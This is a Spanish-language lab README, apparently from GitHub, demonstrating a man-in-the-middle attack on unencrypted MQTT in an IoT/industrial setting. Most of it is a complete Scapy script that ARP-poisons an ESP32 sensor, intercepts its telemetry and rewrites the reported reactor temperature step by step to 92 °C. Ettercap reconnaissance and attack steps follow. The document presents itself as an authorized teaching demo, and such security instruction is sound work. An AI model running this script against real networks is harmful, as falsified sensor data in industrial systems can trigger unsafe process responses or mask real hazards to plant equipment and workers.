# MAN-IN-THE-MOSQUITTO

Este es un laboratorio práctico de ciberseguridad industrial cuyo objetivo principal es demostrar, de forma muy visual y realista, por qué MQTT sin seguridad es extremadamente vulnerable en entornos IoT/OT, y cómo un atacante puede convertirse en Man-in-the-Middle (MitM) para leer, modificar o bloquear datos críticos en tiempo real.

```
@%%%%#%%%%%%%#%#****#####*##@%%%%#%%%%%%%#%#****#####*###+**#***+++****+=+**=+++++**+********##****#**######%##%%*%%%%%%%@@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##%#%%%%#%#%####%#*#*+*#****#*=+=+*+=+***++@%*+==++-*=+*=++*+*+**+*=***+***#*#####%%+##*%##%%%%%@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*###+*#%%%#%#####+#*==********+-+=-++++=+===+=@@@#@+++:=++==:+++=+++=+**+**+*+++***##%#**#%#%%##%@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##=+%++#####*#+***=*=+++*++*+++=====%#+-==+##*%+@%#@+=%=*-@#@===+-++*+*+=*==:=*+#**#+*##*+=#%#%%@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*####+#+*%%####=*-*+=+*==+%%%++--=#**+##@+-=+#=#@%+++%+=*+==-*==+=:+=++====-=-=*#+*####=-##+=#*##@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##*%+#+==%%**+**+--*+=-=++++-+=-=--==+=+--@%=-+%+-+:::==---:=+@@#%%%#++=---=:*=+*+***=*=#*=%%*%%@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*###===#++#****++=-+---+*#%%*=-+@*=--:::*#%**++=+=:@%#::--:-=#%+%%@*===-+:=--=--+=***==+*=#===+##@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*###%=-+#*++*****===-==+--+=+-*--+-----=-:#@:=+--==%=-#==%@%==-=@@+==%#@==+-+@%=-=+=*++=-+#=*#+##@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*###=+-=+***+***==-=-=:@@#++%@+-@%@+:%-%@@@@*-:---==:---=-:-+--=+##*=--+-=====--+++*++***-*=*#*##@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*####=**=*+***+*=++====++====+---=---:=%=-=+:=@%#:-+*---%=::=-#%--*--++#-====-===+++=**=+*+**####@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*####=**+**+*+++++==+#=#=====*#=--+:-:=:=+:-*%+##@%#:=#*%=::--%@%-----++*=+-=====+++++++**++***##@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*###+*=****=*+++-==+@@%@@%@@=%%@-+:--%-::+#%:@:::%-:-++=%#%%-:::--+@---%=-=+-==-==+++=++-+==****#@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*###-******++++=**%=++@@@#=+@@@#%:::::-:@+*=*:::-=:.::=@+-::=::-*--+#--=%:====-=-@*++=+=-++=+****@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##+-+=+*-=++++=--==:--===-+##%%=:=::::%#::::=:::-#%::-=-:-:::#%=:+@@%:--=@*-==-=*@=+=-=+-++=*+**@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##*=-:*=*+-+++%+-=--:-=-%@--::-+:-:#=:::::::::::*=:::::--@#:::::-::%@**:-=@%@--=-======+----==**@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##-++===*=====#%=:=:--::+=:-::#*+*-:%*:::.::.*@@@@@=:::::==@-:=@-:=-:=::-%::.:-:-==#=--+*+=:+=**@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*###=*+==*-*++====--::.:#@@:=:=:-:..:.:..:::.:@@@@@@@@.:.::@%:::=@@%+#:=%@:-:-:---=+=#%*::+-*=***@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##*==+-*%@*+%+=-=+:*-::%%==*-:=:::::-:...::..@@@@@@@@.:..=:.:+-:+-:-::-::=:::---=%=+*-=-+--+*+**@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##*+++*+@%====@====*::#-@*=-%::#-:#+:.......@@@@@@@@@....=+-...::::=:#::+#::==@==-===-====++**+*@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##*++++++===+==-@=-=-----:*=:::::::.........-@@@@@@@@....::..:.:.:::=@::-::=@-=--=-==+++-==++***@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##**+-++===%==-=#=--:*=:+:=::%@:.#=:..........@@@@@@............---.:-:*::+-#:--+----=+%*+-==+**@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##-**-+==+@*====@=*:%#:+:::*@#=#+:::..........@@@@@@.........:...-::=*:+#::::+-:=#-==*@%#:==*++*@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##++*--:=+-*===-:+:-::#=*-:+-:%::...........+@@@@@@@@*.........:.-=-.%%:::%-+--:----=+%*@@--+=++@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##+=----@@%==-=-+=#@:*-:::=:%.:.:........@@@@@@@@@@@@@@@@-.....:%..:=@#::*--%#%*+--+*%==+%-++*+*@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##*+++-@@%*+=:==-:@@=+*+::+:..:.......@@@@@@@@@@@@@@@@@@@@@@....:-:.-@@::::=+:+*---=--+--:-=+*++@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##+=-+@@+@+=+#=--:#%%:@=:@-:::-:.....@@@@@@@@@@@@@@@@@@@@@@@=.....=::+:-:::-*-+-=@---*====-=+++*@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##+****++#=*==@*-:%=-=%%:%--.#.:.....@@@@@@@@@@@@@@@@@@@@@@@@...:.:**-:#:--=:---:+======++++++*+@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##+++++==++=+==%-=--=+:::::-::::+::..@@@@@@@@@@@@@@@@@@@@@@@@.=.:.---::+--*%:+-=--=+=@===+***++*@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##=+==--==#====-:-:%@=:-%%@=:=--:*:-@@@@@@@@@@@@@@@@@@@@@@@@@@..:+:++::##=:-=-%%-+=@@:=-=*++++**@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##--=+-==+@@*----=-:-*.-=:@@@=-:..#+@@@@@@@@@@@@@@@@@@@@@@@@@-.:..:::@+.=:-::+*@*==@@-==-=+-*=+*@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##=+-+++-*%%=+-=%+=:-@+-%=-:.-+...+:@@@@-@@@@@@@@@@@@@@@@@@@@**.+::::-%::-=:-=@#@-+=+-=--:=-+=++@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##+==-=@#*+===-----::@@@#:-::::::-::@@@@.@@@@@@@@@@@@@@@@.@@@@*:@-%##:-*%@=:-:-#=-=+===+:+*==-**@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##****+@+++=+=+==-#---=#%-==-:+*:::@@@@@=@@@@@@@@@@@@@@@@.@@@@=:-:-+:-:@@@--:-=*#+==+**+-*+**+**@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##+#*+++++++++=+=%=#==-*@-#::#*::::@@@@@#@@@@@@@@@@@@@@@@+@@@@::-==:-*%+--#-+--=@=+=*@#+=++****+@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*###=+==+**+++*@+=-=*:-%#**+::::=--:@@@@:@@@@@@@@@@@@@@@@@%+@@@=:*@=-:-:@*++-:-#*%=+*=%==+=++=**#@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*###=++-*-++=++@@#%*==--@@#*+:=:=+%-@@@@-@@@@@@@@@@@@@@@@@@:@@@+++#::::**@@*-:-=#=++=*+-=***+*+**@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##-+#-*--*+++==@@%@--=++:-=@%-==-:.@@@**@@@@@@@@@@@@@@@@@*:%@@@@@*=+=:*@@%@%-:-==+*%@++-===+=+=*@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##*=+++#-*++**+%@@::@*--+==--:==-::@@@::@@@@@@@@@@@@@@@@@@+:@@-:*:*:--+@#%@=::-+=+@@+*==--+=+##*@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##+**==++*++*++-@*--=:*+-*#--*-----@@:-@@@@@@@@@@@@@@@@@@@=:@@#@#*-%--*+*@@=#-+%-*+@+==-=*=**##+@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*###+==#=*#**+*=+=-=:%-#=*=---=-#*-@@@@+@@@@@@@@@@@@@@@@@@@-@@@---+==@-==--@-=-=-+++*+*=-*+=+##+#@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*##+**#*####*+*+**+-+%@#=*==++=*-*--@@@%@@@@@@@@@@@@@@@@@@@@@@@----=--===-=+=+=+=*+******=#+####%@%%%%#%%%%%%%#%#****#####*##
@%%%%#%%%%%%%#%#****#####*#######*##*#*****+==+@++=++*@=@%+*-@@*@@@@@@@@@@@@@@@@@@@@@-@@-=@@%#-=+*====++++*+*********####%@%%%%#%%%%%%%#%#****#####*##
```

---

## Diagrama a alto nivel:

- `ESP32 insecure ↔ Broker:1883 (allow_anonymous)`  
    Para demostrar mensajes en texto plano que cualquiera puede interceptar.
- `ESP32 secure ↔ Broker:8883 (TLS + auth + ACL)`  
    Para ver flujo cifrado y controlado por credenciales/ACL.
- `Ettercap` y `Wireshark` escuchando la LAN.  
	Capturar tráfico de ambos escenarios para comparar.

---


## Herramientas:

- Mosquitto Broker: `sudo apt install -y mosquitto mosquitto-clients`, esto instala el broker y los clientes de línea de comandos (mosquitto_pub, mosquitto_sub).
- Wireshark: `sudo apt install -y wireshark tshark`, captura y análisis de paquetes.
- Ettercap: `sudo apt install -y ettercap-common ettercap-graphical`, MITM clásico con interfaz gráfica y textual.
- Libreria en Scapy: `pip3 install scapy`, imprescindible para el script Python del ataque MITM.

## Creacion del codigo en:

```
#!/usr/bin/env python3
"""
Demostración ética de integridad en MQTT sin cifrar
Laboratorio autorizado – Proyecto académico
"""

from scapy.all import *
import random, time, os
from threading import Thread
from datetime import datetime

# ====================================================
# CONFIGURACIÓN (ajustar según tu red de laboratorio)
# ====================================================
IFACE       = "wlp3s0"                  # interfaz Wi-Fi del atacante
MY_IP       = "XXX.XXX.XXX.XXX"           # IP de tu máquina (broker local)
MY_MAC      = get_if_hwaddr(IFACE)      # se obtiene automáticamente
ESP32_IP    = "XXX.XXX.XXX.XXX"           # IP del sensor ESP32
ESP32_MAC   = "XX:XX:XX:XX:XX:XX"       # MAC del ESP32
TARGET_TEMP = 92.0                      # valor crítico objetivo
# ====================================================

current_temp = 38.0
last_update  = 0
peak_reached = False

# ----------------------------------------------------
# ARP poisoning continuo (solo hacia el sensor)
# ----------------------------------------------------
def arp_spoof():
    while True:
        send(ARP(op=2, pdst=ESP32_IP, psrc=MY_IP, hwdst=ESP32_MAC), verbose=0)
        time.sleep(1.8)

# ----------------------------------------------------
# Cabecera elegante
# ----------------------------------------------------
def print_header():
    os.system('clear')
    print("\033[90m┌" + "─" * 68 + "┐\033[0m")
    print("│ \033[97;44m MQTT INTEGRITY DEMONSTRATION – LIVE MANIPULATION \033[0m │")
    print("\033[90m└" + "─" * 68 + "┘\033[0m\n")

# ----------------------------------------------------
# MITM + reescritura de temperatura
# ----------------------------------------------------
def mitm(pkt):
    global current_temp, last_update, peak_reached

    if not pkt.haslayer(Raw):
        return
    payload = pkt[Raw].load

    # Paquetes del sensor → broker
    if (pkt.haslayer(IP) and pkt[IP].src == ESP32_IP and
        pkt.haslayer(TCP) and pkt[TCP].dport == 1883 and
        b'"temp"' in payload):

        try:
            txt = payload.decode()
            real_temp = float(txt.split('"temp":')[1].split(',')[0])

            # escalada progresiva
            current_temp += round(random.uniform(2.1, 4.3), 1)
            if current_temp > TARGET_TEMP:
                current_temp = TARGET_TEMP
                peak_reached = True
            forged_temp = round(current_temp, 1)

            forged_txt = txt.replace(f'"temp":{real_temp}', f'"temp":{forged_temp}', 1)
            forged_payload = forged_txt.encode()

            # truco Wi-Fi (dst = propia MAC)
            spoofed = (Ether(src=MY_MAC, dst=MY_MAC) /
                       IP(src=ESP32_IP, dst=MY_IP) /
                       pkt[TCP] /
                       Raw(forged_payload))

            delta = len(forged_payload) - len(payload)
            if delta:
                spoofed[TCP].seq += delta

            sendp(spoofed, iface=IFACE, verbose=0)

            # actualización de pantalla
            if time.time() - last_update > 0.9 or peak_reached:
                print_header()
                print(f"  \033[96mTarget Device\033[0m : {ESP32_IP} ({ESP32_MAC})")
                print(f"  \033[96mMQTT Broker\033[0m   : {MY_IP}:1883")
                print(f"  \033[96mTopic\033[0m         : planta/reactor1/temperatura")
                print(f"  \033[96mTimestamp\033[0m     : {datetime.now():%Y-%m-%d %H:%M:%S}\n")

                print(f"  \033[93mOriginal value\033[0m  : {real_temp:6.1f} °C")
                print(f"  \033[91mInjected value\033[0m  : {forged_temp:6.1f} °C\033[0m")

                ratio   = forged_temp / TARGET_TEMP
                blocks  = int(50 * ratio)
                bar     = "█" * blocks + "░" * (50 - blocks)
                color   = "\033[92m" if forged_temp < 70 else "\033[93m" if forged_temp < 92 else "\033[91m"
                print(f"\n  Progress → [{color}{bar}\033[0m] {forged_temp:5.1f} / {TARGET_TEMP} °C\n")

                if forged_temp >= TARGET_TEMP:
                    print("  \033[41;97m CRITICAL THRESHOLD INJECTED SUCCESSFULLY \033[0m")
                    print("\n  \033[90mLaboratory demonstration completed – integrity compromised.\033[0m")
                else:
                    print(f"  \033[90mStatus: Escalating payload… (+{forged_temp-38.0:.1f} °C from baseline)\033[0m")

                last_update = time.time()

        except:
            pass

    # Reenvío broker → sensor (mantiene la conexión viva)
    elif pkt.haslayer(IP) and pkt[IP].dst == ESP32_IP and pkt[TCP].sport == 1883:
        sendp(Ether(src=MY_MAC, dst=MY_MAC) / pkt[IP], iface=IFACE, verbose=0)

# ====================================================
# INICIO DE LA DEMOSTRACIÓN
# ====================================================
print_header()
print("  \033[92m[+] Initializing transparent man-in-the-middle (ethical lab)\033[0m")
print("  \033[92m[+] ARP cache poisoning in progress\033[0m")
print("  \033[92m[+] Intercepting and rewriting temperature telemetry\033[0m\n")

Thread(target=arp_spoof, daemon=True).start()
time.sleep(2.5)
sniff(iface=IFACE, prn=mitm, filter="tcp port 1883", store=0)
```




### Explicacion del codigo:

1. El sensor ESP32 mide la temperatura cada pocos segundos y se la envía a tu ordenador (el “broker”).
2. El script le miente al sensor diciendo:
“Ey, yo soy tu ordenador, mándame los datos a mí”.
4. Cuando el sensor envía la temperatura real (por ejemplo 30 °C), el script la intercepta antes de que llegue al ordenador.
5. El script cambia ese número por uno más alto (la sube de a poquito cada vez: 35 → 42 → 59 → 78 → 92 °C).
6. Le entrega al ordenador SOLO la temperatura falsa (el ordenador nunca ve la verdadera).
7. En pantalla vas viendo en vivo cómo la temperatura “sube sola” hasta llegar a 92 °C y se pone en rojo diciendo “¡umbral crítico alcanzado!”.


---


## Metodologia del ataque:

1. Fase de reconocimiento y mapeo de la red:
  - Herramientas: `ettercap`, este realizara:
    - Envío masivo de ARP who-has a todas las direcciones de la subred 10.235.248.0/24
    - Envío paralelo de ICMP echo-request (ping sweep) para forzar respuestas ARP adicionales
    - Escucha pasiva de tráfico ARP broadcast existente
    - Construcción automática de tabla IP ↔ MAC ↔ Fabricante

2. Fase de envenenamiento ARP dirigido (ARP Spoofing):
   - Se engaña al ESP32 haciendole pensar que la IP del broker MQTT ahora tiene nuestra MAC de atacante, y se podran ver los paquetes ya que son redireccionados.
  
3. Fase de intercepcion y modificacion de parametros:
   - Se capturan los paquetes MQTT con `sniff()` de Scapy.
   - Se identifican los paquetes que tiene el formato JSON de los valores de la temperatura.
   - Se cambian los valores progresivamente para que se eleven a 92.0 °C.
   - Se reconstruyen los paquetes con la MAC de origen y MAC de destino, ajustando el numero de secuencia TCP cuando se cambia la longitud del payload e incluyendo los demas campos del paquete.

4. Fase de reenvio transparente:
   - Todos los paquetes del broker hacia el ESP32 se reenvian inmediatamente con la MAC del atacante como origen, esto mantiene la sesion MQTT viva indefinidamente.

## Ataque:

- Iniciar ettercap `sudo ettercap -G`:


<img width="943" height="555" alt="image" src="https://github.com/user-attachments/assets/9aedd907-57fe-4c3c-9370-cfd667223a9f" />


- Mapeamos las IPs de la red:
  

<img width="928" height="544" alt="image" src="https://github.com/user-attachments/assets/7f448262-d11c-4eca-bfe3-918e933fc175" />


- Mapeo de red (IPs y MACs):
  

<img width="894" height="539" alt="image" src="https://github.com/user-attachments/assets/ac67c0ef-6d8d-40f0-93f5-18599bbda278" />


- En el apartado `View` -> `Connections` podemos ver los paquetes que se envian:


<img width="926" height="533" alt="image" src="https://github.com/user-attachments/assets/adba5ee3-a2fc-4b04-b9d2-8bdd6d74aa4c" />


- Activar el codigo y utilizar `mosquitto_sub` para poder ver como los paquetes le llegan al broker:


<img width="1151" height="698" alt="image" src="https://github.com/user-attachments/assets/abdec175-30b5-45fd-8b54-d195a60a4cba" />


